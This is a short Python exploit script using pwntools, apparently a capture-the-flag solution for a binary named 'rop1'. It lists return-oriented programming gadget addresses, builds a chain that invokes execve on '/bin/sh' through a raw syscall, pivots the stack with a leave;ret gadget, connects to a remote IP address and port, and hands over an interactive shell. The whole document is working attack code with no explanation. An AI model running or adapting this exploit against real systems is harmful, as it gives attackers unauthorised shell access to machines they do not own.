from pwn import *

context.binary = 'rop1'

# 0x0000000000401516 : pop rdi ; ret
pop_rdi = 0x401516
# 0x0000000000409a34 : pop rax ; ret 0xffff
pop_rax = 0x409a34
# 0x0000000000478616 : pop rax ; pop rdx ; pop rbx ; ret
pop_rax_rdx_rbx = 0x478616
# 0x0000000000442909 : pop rdx ; pop rsi ; ret
pop_rdx_rsi = 0x442909
# 0x00000000004003da : syscall
syscall = 0x4003da
# 0x00000000004009e4 : leave ; ret
leave = 0x4009e4
sh = 0x6ccd60

r = process('rop1')
r = remote('140.110.112.77', 3122)
raw_input('debug: ')
payload = flat(pop_rdi, sh, pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rdx_rsi, 0, 0, syscall)
r.sendline('/bin/sh\0' + 'a' * 8 + payload)
r.recvuntil('input_size')
payload = 'a' * 0x20
payload += flat(sh + 8, leave)
r.sendline(payload)
r.interactive()
